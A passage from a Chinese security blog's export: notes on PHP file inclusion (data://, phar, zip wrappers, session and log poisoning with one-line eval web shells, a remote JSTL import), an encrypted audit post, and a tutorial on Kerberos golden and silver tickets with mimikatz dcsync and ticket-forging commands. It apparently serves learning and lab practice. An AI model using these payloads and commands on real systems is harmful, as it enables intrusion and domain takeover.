<p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200203183726.png" alt></p>
<h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p>
<p>利用条件：</p>
<p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p>
<p>示例1：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">/index2.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-5449b681b9c47ddb%5B1%5D.png" alt></p>
<p>执行命令：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">index2.php?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain;<span class="meta">&lt;?</span>php <span class="keyword">system</span>(<span class="string">"whoami"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-0fce621191e72481%5B1%5D.png" alt></p>
<p>示例2：</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">/index2.php?<span class="keyword">file</span>=data:<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>

<p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p>
<p><strong>包含session</strong></p>
<p>利用条件：session文件路径已知，且其中内容部分可控。</p>
<p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-dd5195fec4210a53.png" alt></p>
<p>session文件的绝对路径可在phpinfo中查看，session.save_path</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-1e7dd8fd1a028711%5B1%5D.png" alt></p>
<p>常见的php-session存放位置还有这几个：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>

<p>使用以下命令可查看到session文件中的登录信息</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">strings /<span class="keyword">var</span>/lib/php5/sess_258c1be1b00d080bddc58d2896460542facb6f1f | grep root</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-940bb1d740bd0d47%5B1%5D.png" alt></p>
<p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'root'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-c833b1fd110b6170%5B1%5D.png" alt></p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-5304d206d0b1fcc8%5B1%5D.png" alt></p>
<p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p>
<p>加上cookie之后在重新连接，成功连接</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-44a9d0f1054d26b9%5B1%5D.png" alt></p>
<h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h5><ul>
<li><p>利用条件：php版本大于等于php5.3.0</p>
</li>
<li><p>这个参数就是php解压缩包的一个函数，不管后缀是什么，都会被当做压缩包来解压。</p>
<p>用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php </p>
<p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p>
</li>
<li><p>姿势：假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：</p>
</li>
</ul>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-041eece378dca1e4.png" alt></p>
<p>指定绝对路径：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">index2.php?file=phar://C:<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\F</span>ileInclusion<span class="symbol">\p</span>hpinfo.zip<span class="symbol">\p</span>hpinfo.txt</span><br></pre></td></tr></table></figure>

<p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line">index2.php?<span class="keyword">file</span>=phar:<span class="comment">//phpinfo.zip/phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-489da319d283d845.png" alt></p>
<h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul>
<li><p>php版本大于等于php5.3.0</p>
</li>
<li><p>zip伪协议和phar协议类似，但是用法不一样。</p>
</li>
<li><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</p>
</li>
<li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
</li>
</ul>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">index2.php?file=zip://C:<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\F</span>ileInclusion<span class="symbol">\p</span>hpinfo.zip<span class="variable">%23phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<h4 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h4><p>如果目标服务器关闭了allow_url_fopen，则可以尝试使用本地包含+文件上传<br>上传一个图片木马a.jpg，内容为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval($_POST[tzc]);?&gt;"</span>)<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p>
<ul>
<li>1.日志的物理存放路径</li>
<li>2.存在文件包含漏洞</li>
</ul>
<p>获取日志存放路径</p>
<p>（一）日志默认路径</p>
<p>(1) apache+Linux日志默认路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/<span class="built_in">log</span>/httpd/access_log</span><br></pre></td></tr></table></figure>

<p>(2) apache+win2003日志默认路径</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">D:\xampp\apache\logs\access.<span class="built_in">log</span></span><br><span class="line">D:\xampp\apache\logs\error.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>(3) IIS6.0+win2003默认日志文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\Logfiles</span><br></pre></td></tr></table></figure>

<p>(4) IIS7.0+win2003 默认日志文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%SystemDrive%\inetpub\logs\LogFiles</span><br></pre></td></tr></table></figure>

<p>(5) nginx 日志文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">日志文件在用户安装目录logs目录下</span><br><span class="line">        以我的安装路径为例/usr/<span class="built_in">local</span>/nginx,</span><br><span class="line">        那我的日志目录就是在/usr/<span class="built_in">local</span>/nginx/logs里</span><br></pre></td></tr></table></figure>

<p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[c]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-f9f0db6a9d7ff53a%5B1%5D.png" alt></p>
<p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-738380f7e8b09e46%5B1%5D.png" alt></p>
<p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/127.0.0.1:81/</span>FileInclusion/index2.php?page=%<span class="number">3</span>C?php%<span class="number">20</span>@eval($_POST[c]);<span class="string">?%</span><span class="number">3</span>E</span><br></pre></td></tr></table></figure>

<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="string">"&lt;"</span>  ----&gt; 大于号被转码为了 %<span class="number">3</span>C</span><br><span class="line"> <span class="string">"&gt;"</span>  ----&gt; 小于号被转码为了 %<span class="number">3</span>E</span><br><span class="line"> <span class="string">" "</span>   ----&gt; 空格被转码为了 %<span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p>
<p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-ff2a0beae4cc4468%5B1%5D.png" alt></p>
<p>（2） 测试记录：成功<br>通过文件包含直接访问服务日志文件，发现一句话被执行成功；</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-f5d368a6f62b9802%5B1%5D.png" alt></p>
<p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p>
<p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/127.0.0.1:81/</span>FileInclusion/index2.php%<span class="number">3</span>C?php%<span class="number">20</span>@eval($_POST[c]);<span class="string">?%</span><span class="number">3</span>E</span><br></pre></td></tr></table></figure>

<p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-e094a1b3f7e98f45%5B1%5D.png" alt></p>
<p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:81/FileInclusion/index2.php?file=C:/phpStudy/Apache/logs/access.log</span></span><br></pre></td></tr></table></figure>

<p>客户端连接，获取一句话木马</p>
<h5 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h5><p>利用的条件：</p>
<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p>
<h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p>
<h4 id="jsp文件包含漏洞"><a href="#jsp文件包含漏洞" class="headerlink" title="jsp文件包含漏洞"></a>jsp文件包含漏洞</h4><p>include</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;%@ include <span class="keyword">file</span>=<span class="string">"head.jsp"</span>%&gt;</span><br><span class="line">&lt;%@ include <span class="keyword">file</span>=<span class="string">"body.jsp"</span>%&gt;</span><br><span class="line">&lt;%@ include <span class="keyword">file</span>=<span class="string">"tail.jsp"</span>%&gt;</span><br></pre></td></tr></table></figure>

<p>jsp:include</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;jsp:include <span class="attribute">page</span>=<span class="string">"head.jsp"</span>/&gt;</span><br><span class="line">&lt;jsp:include <span class="attribute">page</span>=<span class="string">"body.jsp"</span>/&gt;   </span><br><span class="line">&lt;jsp:include <span class="attribute">page</span>=<span class="string">"tail.jsp”/&gt;</span></span><br></pre></td></tr></table></figure>

<p>采用JSTL</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">c</span>:<span class="keyword">import</span> url="http:<span class="comment">//thief.one/1.jsp"&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="asp文件包含漏洞"><a href="#asp文件包含漏洞" class="headerlink" title="asp文件包含漏洞"></a>asp文件包含漏洞</h4><p>asp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#include file="1.asp" --&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="aspx文件包含漏洞"><a href="#aspx文件包含漏洞" class="headerlink" title="aspx文件包含漏洞"></a>aspx文件包含漏洞</h4><p>aspx文件包含与asp一样，语法如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--#include file="top.aspx" --&gt;</span></span><br></pre></td></tr></table></figure>



<hr>
<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p>
<p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
<p><a href="https://blog.csdn.net/God_XiangYu/article/details/97335988#asp文件包含漏洞" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/97335988#asp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E</a></p>
<p><a href="https://thief.one/2017/04/10/2/" target="_blank" rel="noopener">https://thief.one/2017/04/10/2/</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>文件包含漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Jizhicms代码审计</title>
    <url>/2020/06/28/mou-cms-dai-ma-shen-ji/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="91270d06592d4284604580f4a44befa04332c411925c8bb938910048897a7453">fe040a29e7dd22b4e0f1dcc4236675aa</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>php代码审计学习</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析黄金票据与白银票据</title>
    <url>/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</url>
    <content><![CDATA[<h2 id="浅析黄金票据与白银票据"><a href="#浅析黄金票据与白银票据" class="headerlink" title="浅析黄金票据与白银票据"></a>浅析黄金票据与白银票据</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​        票据传递攻击（PtT）是一种使用Kerberos票据代替明文密码或NTLM哈希的方法。PtT最常见的用途可能是使用<strong>黄金票据</strong>和<strong>白银票据</strong>，通过PtT访问主机相当简单。</p>
<h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>我们首先需要学习关于kerberos认证</p>
<ul>
<li><strong>KDC</strong>(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS</li>
<li><strong>AS</strong>(Authentication Server)： 身份认证服务</li>
<li><strong>TGS</strong>(Ticket Granting Server)： 票据授予服务</li>
<li><strong>TGT</strong>(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时</li>
<li><strong>Pass The Ticket</strong>： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限</li>
</ul>
<h3 id="金票-GoldenTicket"><a href="#金票-GoldenTicket" class="headerlink" title="(金票)GoldenTicket"></a>(金票)GoldenTicket</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>​        <strong>Golden Ticket</strong>（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p>
<p>​        每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的TICKET,</p>
<p>​        对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的Hash值，，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket。</p>
<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/2016011804523676070160.png" alt="Alt text"></p>
<h5 id="黄金票据特点"><a href="#黄金票据特点" class="headerlink" title="黄金票据特点"></a>黄金票据特点</h5><ul>
<li>域控制器中的KDC服务不验证TGT中的用户帐户，直到<a href="http://passing-the-hash.blogspot.com/2014/09/pac-validation-20-minute-rule-and.html" target="_blank" rel="noopener">TGT超过20分钟，</a>这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li>
<li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li>
<li>该<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">KRBTGT</a>帐户密码<a href="http://adsecurity.org/?p=483" target="_blank" rel="noopener">从不更改*</a>和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</li>
<li>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证。</li>
<li>.这个精心创建的TGT要求攻击者拥有Active Directory域的KRBTGT密码哈希值（<a href="http://adsecurity.org/?p=451" target="_blank" rel="noopener">通常从域控制器转储</a>）。</li>
<li>KRBTGT NTLM哈希可用于生成一个有效的TGT（使用RC4）模拟任何用户访问Active Directory中的任何资源。</li>
<li>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。</li>
<li>用于从AD森林中的DC获取有效的TGS票据，并提供一个坚持在一切域访问所有的主机的好办法。</li>
</ul>
<h5 id="制作金票的条件："><a href="#制作金票的条件：" class="headerlink" title="制作金票的条件："></a>制作金票的条件：</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、域名称            </span><br><span class="line"><span class="number">2</span>、域的SID值</span><br><span class="line"><span class="number">3</span>、域的KRBTGT账户密码HASH</span><br><span class="line"><span class="number">4</span>、伪造用户名，可以是任意的</span><br></pre></td></tr></table></figure>

<p>实战中，通常使用Mimikatz来提取krbtgt的NTLM-Hash。</p>
<p>1.获取域名称</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">view</span> /<span class="built_in">domain</span></span><br></pre></td></tr></table></figure>

<p>2.Mimikatz获取krbtgt的HTLM-Hash及域SID</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span> <span class="string">"lsadump::dcsync /domain:test666.com /user:krbtgt"</span></span><br></pre></td></tr></table></figure>

<p>3..Mimikatz生成黄金票据</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">mimikatz "kerberos::golden /domain:test666.com /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1497092113</span><span class="string">-2272191533</span><span class="string">-193330055</span> /krbtgt:cac9c793eb3ba2c6abbcc9c14f18a41f /user:test666 /ticket:golden.kirbi"</span><br></pre></td></tr></table></figure>

<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤:"></a>利用步骤:</h4><h5 id="1-导出krbtgt的Hash"><a href="#1-导出krbtgt的Hash" class="headerlink" title="1.导出krbtgt的Hash"></a><strong>1.导出krbtgt的Hash</strong></h5><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">lsadump:</span>:dcsync <span class="regexp">/OWA2010SP3.0day.org /</span><span class="string">user:</span>krbtgt</span><br></pre></td></tr></table></figure>

<p>命令获取krbtgt的值。</p>
<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566542295163.png" alt></p>
<h5 id="2-生成Golden-Ticket"><a href="#2-生成Golden-Ticket" class="headerlink" title="2.生成Golden Ticket"></a><strong>2.生成Golden Ticket</strong></h5><p>​        得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p>
<p>参数说明：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">/admin</span>：伪造的用户名</span><br><span class="line"><span class="string">/domain</span>：域名称</span><br><span class="line"><span class="string">/sid</span>：SID值，注意是去掉最后一个-后面的值</span><br><span class="line"><span class="string">/krbtgt</span>：krbtgt的HASH值</span><br><span class="line"><span class="string">/ticket</span>：生成的票据名称</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:<span class="number">0</span>day.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1812960810</span><span class="number">-2335050734</span><span class="number">-3517558805</span> /krbtgt:<span class="number">36f</span>9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566543225966.png" alt></p>
<h5 id="3-导入伪造Golden-Ticket获得域控权限"><a href="#3-导入伪造Golden-Ticket获得域控权限" class="headerlink" title="3.  导入伪造Golden Ticket获得域控权限"></a><strong>3.  导入伪造Golden Ticket获得域控权限</strong></h5><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::<span class="built_in">list</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566542805439.png" alt></p>
<p>此时就可以通过dir成功访问域控的共享文件夹。</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dir <span class="symbol">\\</span>OWA2010SP3.0day.org<span class="symbol">\c</span>$</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1566543260644.png" alt></p>
<p><strong>TIPS:</strong></p>
<p>​    生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash<br>可以用<strong>mimikatz “lsadump::lsa /patch”</strong>导出:</p>
<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/1049983-20171227215506456-245748150.png" alt="img"></p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul>
<li>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可。</li>
<li>可以伪造任意用户，即使其不存在。</li>
<li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码。</li>
</ul>
<h4 id="黄金票据防御"><a href="#黄金票据防御" class="headerlink" title="黄金票据防御"></a>黄金票据防御</h4><ul>
<li><strong>限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组</strong>。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</li>
<li><strong>禁用KRBTGT帐户，并保存当前的密码以及以前的密码</strong>。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</li>
</ul>
<h3 id="银票-SilverTickets"><a href="#银票-SilverTickets" class="headerlink" title="(银票)SilverTickets"></a>(银票)SilverTickets</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>​        Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。</p>
<p><strong>正确的认证流程:</strong></p>
<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/20160118045254154911118.png" alt="Alt text"></p>
<p><strong>使用了Silver Ticke的认证流程:</strong></p>
<p><img src="/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/20160118045256924591213.png" alt="Alt text"></p>
<h5 id="白银票据的特点"><a href="#白银票据的特点" class="headerlink" title="白银票据的特点"></a>白银票据的特点</h5><ul>
<li>.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li>
<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li>
<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
<li>攻击者需要服务帐户密码哈希值</li>
<li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</li>
<li>任何事件日志都在目标服务器上。</li>
</ul>
<p><strong>制作银票的条件：</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>域名称</span><br><span class="line"><span class="number">2.</span>域的SID值</span><br><span class="line"><span class="number">3.</span>域中的Server服务器账户的NTLM-Hash</span><br><span class="line"><span class="number">4.</span>伪造的用户名，可以是任意用户名.</span><br><span class="line"><span class="number">5.</span>目标服务器上面的kerberos服务</span><br></pre></td></tr></table></figure>

<p><strong>白银票据的服务列表</strong></p>
